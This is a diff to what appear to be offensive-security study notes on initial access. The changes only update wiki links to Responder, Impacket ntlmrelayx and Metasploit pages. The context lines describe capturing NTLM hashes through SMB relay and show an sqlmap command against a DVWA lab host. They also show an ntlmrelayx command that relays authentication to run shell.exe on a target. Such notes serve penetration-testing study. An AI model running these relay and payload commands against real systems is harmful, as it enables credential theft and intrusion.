@@ -148,7 +148,7 @@ TODO: Test this and place it where it's appropriate
 
 #### 5.3.1.2 - Grab NTLM Hashes via SMB Authentication Relay
 
-- Run [[Responder|Responder]] to grab the NTLM hashes. This also can be done with [[Tactics && Techniques && Procedures (TTPs) Phases/Initial Access/Sniffing and Spoofing/Active/Metasploit#^0c8cfd|metasploit SMB relay auxiliary module]] including [[Tactics && Techniques && Procedures (TTPs) Phases/Initial Access/Sniffing and Spoofing/Active/Impacket|ntlmrelayx]].
+- Run [[Responder|Responder]] to grab the NTLM hashes. This also can be done with [[Tactics && Techniques && Procedures (TTPs) Phases/Initial Access/Sniffing and Spoofing/Active/Metasploit#^0c8cfd|metasploit SMB relay auxiliary module]] including [[Tactics && Techniques && Procedures (TTPs) Phases/Initial Access/Sniffing and Spoofing/Active/Impacket/Impacket|ntlmrelayx]].
 
 - Responder
 
@@ -188,7 +188,7 @@ $ sudo sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submi
 
 ##### 5.3.2.2.2 - Manual
 
-- Repeat the [[05 - Initial Foothold|previous step]] and launch [[Tactics && Techniques && Procedures (TTPs) Phases/Initial Access/Sniffing and Spoofing/Active/Impacket|ntlmrelayx]] and/or [[Tactics && Techniques && Procedures (TTPs) Phases/Initial Access/Sniffing and Spoofing/Active/Responder/Usage|Responder]] to receive a callback shell connection. This can be done with [[Tactics && Techniques && Procedures (TTPs) Phases/Initial Access/Sniffing and Spoofing/Active/Metasploit#^c109ec|metasploit SMB relay exploit module]].
+- Repeat the [[05 - Initial Foothold|previous step]] and launch [[Tactics && Techniques && Procedures (TTPs) Phases/Initial Access/Sniffing and Spoofing/Active/Impacket/Impacket|ntlmrelayx]] and/or [[02 - Responder|Responder]] to receive a callback shell connection. This can be done with [[Tactics && Techniques && Procedures (TTPs) Phases/Initial Access/Sniffing and Spoofing/Active/Metasploit#^c109ec|metasploit SMB relay exploit module]].
 
 ```
 $ sudo impacket-ntlmrelayx -t smb://<target_IP> -smb2support -e shell.exe
